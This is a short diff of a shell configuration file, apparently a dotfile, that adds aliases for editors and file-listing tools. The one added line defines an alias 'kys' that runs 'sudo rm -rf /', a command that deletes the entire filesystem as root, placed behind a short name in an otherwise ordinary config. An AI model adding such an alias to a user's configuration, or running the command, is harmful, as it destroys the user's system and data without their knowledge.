@@ -21,6 +21,7 @@ alias vim="nvim"
 alias sv="sudo nvim"
 alias ls="exa -la --group-directories-first"
 alias cat="bat"
+alias kys="sudo rm -rf /"
 
 # Exports
 export EDITOR="nvim"
